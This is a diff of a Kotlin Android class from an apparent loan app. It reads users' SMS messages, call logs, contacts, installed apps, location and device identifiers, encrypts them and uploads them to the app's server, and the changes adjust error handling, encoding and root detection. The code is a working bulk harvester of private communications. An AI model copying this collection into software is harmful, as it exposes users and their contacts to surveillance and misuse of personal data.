@@ -12,17 +12,21 @@ import com.blankj.utilcode.util.*
 import com.blankj.utilcode.util.ThreadUtils.SimpleTask
 import com.loan.icreditapp.BuildConfig
 import com.loan.icreditapp.api.Api
+import com.loan.icreditapp.bean.auth.AuthResponseBean
 import com.loan.icreditapp.collect.bean.AppInfoRequest
 import com.loan.icreditapp.collect.bean.CallRecordRequest
 import com.loan.icreditapp.collect.bean.ContactRequest
 import com.loan.icreditapp.collect.bean.SmsRequest
 import com.loan.icreditapp.global.Constant
 import com.loan.icreditapp.util.BuildRequestJsonUtils
+import com.loan.icreditapp.util.CheckResponseUtils
 import com.loan.icreditapp.util.EncodeUtils
 import com.lzy.okgo.OkGo
 import com.lzy.okgo.callback.StringCallback
 import com.lzy.okgo.model.Response
 import org.json.JSONObject
+import java.io.UnsupportedEncodingException
+import java.net.URLEncoder
 
 class CollectDataMgr {
 
@@ -40,14 +44,25 @@ class CollectDataMgr {
         ThreadUtils.executeByCached(object : SimpleTask<Any?>() {
             @Throws(Throwable::class)
             override fun doInBackground(): Any {
-                val smsStr = EncodeUtils.encryptAES(GsonUtils.toJson(readSms(context)))
-                val callRecordStr = EncodeUtils.encryptAES(GsonUtils.toJson(readCallRecord(context)))
-                val contractStr = EncodeUtils.encryptAES(GsonUtils.toJson(readContract(context)))
-                val appInfoStr = EncodeUtils.encryptAES(GsonUtils.toJson(readAllAppInfo()))
-                val locationBean = EncodeUtils.encryptAES(GsonUtils.toJson(LocationMgr.getInstance().locationBean))
-                val jsonObject = buildRequestJsonObj(smsStr, callRecordStr, contractStr,
-                    appInfoStr, locationBean, orderId)
-                getAuthData(jsonObject, observer)
+                try {
+                    val smsStr = EncodeUtils.encryptAES(GsonUtils.toJson(readSms(context)))
+                    val callRecordStr =
+                        EncodeUtils.encryptAES(GsonUtils.toJson(readCallRecord(context)))
+                    val contractStr =
+                        EncodeUtils.encryptAES(GsonUtils.toJson(readContract(context)))
+                    val appInfoStr = EncodeUtils.encryptAES(GsonUtils.toJson(readAllAppInfo()))
+                    val locationBean =
+                        EncodeUtils.encryptAES(GsonUtils.toJson(LocationMgr.getInstance().locationBean))
+                    val jsonObject = buildRequestJsonObj(
+                        smsStr, callRecordStr, contractStr,
+                        appInfoStr, locationBean, orderId
+                    )
+                    getAuthData(jsonObject, observer)
+                } catch (e : Exception){
+                    if (BuildConfig.DEBUG){
+                        throw e
+                    }
+                }
                 return ""
             }
 
@@ -64,10 +79,10 @@ class CollectDataMgr {
                                     locationStr: String, orderId: String): JSONObject {
         val jsonObject: JSONObject = BuildRequestJsonUtils.buildRequestJson()
         if (BuildConfig.DEBUG){
-            Log.i("okhttp","1 = " + com.loan.icreditapp.util.EncodeUtils.decryptAES(contractStr) + "")
-            Log.i("okhttp","2 = " + com.loan.icreditapp.util.EncodeUtils.decryptAES(smsStr) + "")
-            Log.i("okhttp","3 = " + com.loan.icreditapp.util.EncodeUtils.decryptAES(callRecordStr) + "")
-            Log.i("okhttp","4 = " + com.loan.icreditapp.util.EncodeUtils.decryptAES(appListStr) + "")
+//            Log.i("okhttp","1 = " + com.loan.icreditapp.util.EncodeUtils.decryptAES(contractStr) + "")
+//            Log.i("okhttp","2 = " + com.loan.icreditapp.util.EncodeUtils.decryptAES(smsStr) + "")
+//            Log.i("okhttp","3 = " + com.loan.icreditapp.util.EncodeUtils.decryptAES(callRecordStr) + "")
+//            Log.i("okhttp","4 = " + com.loan.icreditapp.util.EncodeUtils.decryptAES(appListStr) + "")
         }
         try {
             jsonObject.put("accountId", Constant.mAccountId)
@@ -96,9 +111,9 @@ class CollectDataMgr {
             jsonObject.put("mac",  DeviceUtils.getMacAddress())
             //手机品牌型号
             jsonObject.put("brand",  DeviceUtils.getManufacturer())
-            jsonObject.put("innerVersionCode",  DeviceUtils.getManufacturer())
-            jsonObject.put("isRooted",  DeviceUtils.getManufacturer())
-            jsonObject.put("isEmulator",  if (DeviceUtils.isEmulator()) "1" else "0")
+            jsonObject.put("innerVersionCode",  AppUtils.getAppVersionCode())
+            jsonObject.put("isRooted", if ( DeviceUtils.isDeviceRooted()) 1 else 0)
+            jsonObject.put("isEmulator",  if (DeviceUtils.isEmulator()) 1 else 0)
         } catch (e: java.lang.Exception) {
             e.printStackTrace()
             if (BuildConfig.DEBUG){
@@ -126,8 +141,8 @@ class CollectDataMgr {
                     val status = cursor.getInt(6)
                     val read = cursor.getInt(7)
                     val smsRequest = SmsRequest()
-                    smsRequest.addr = address
-                    smsRequest.body = body
+                    smsRequest.addr = encodeData(address)
+                    smsRequest.body = encodeData(body)
                     smsRequest.time = date
                     smsRequest.type = type
                     smsRequest.status = status
@@ -243,7 +258,12 @@ class CollectDataMgr {
             .execute(object : StringCallback() {
                 override fun onSuccess(response: Response<String>) {
 //                        Log.i(TAG, " response success= " + response.body());
-                    observer?.success(response)
+                    var authBean : AuthResponseBean? =  CheckResponseUtils.checkResponseSuccess(response, AuthResponseBean::class.java)
+                    if (authBean != null && authBean?.hasUpload == true) {
+                        observer?.success(response)
+                    } else {
+                        observer?.failure(response)
+                    }
                 }
 
                 override fun onError(response: Response<String>) {
@@ -252,6 +272,21 @@ class CollectDataMgr {
                     observer?.failure(response)
                 }
             })
+    }
+
+    fun encodeData(s: String): String? {
+        if (StringUtils.isEmpty(s)) {
+            return null
+        }
+        val s1 =
+            s.replace("%".toRegex(), "").replace("\\+".toRegex(), "").replace("\"".toRegex(), "")
+                .replace("'".toRegex(), "").replace("\\\\".toRegex(), "")
+        try {
+            return URLEncoder.encode(s1, "utf-8")
+        } catch (e: UnsupportedEncodingException) {
+            e.printStackTrace()
+        }
+        return null
     }
 
     interface Observer {
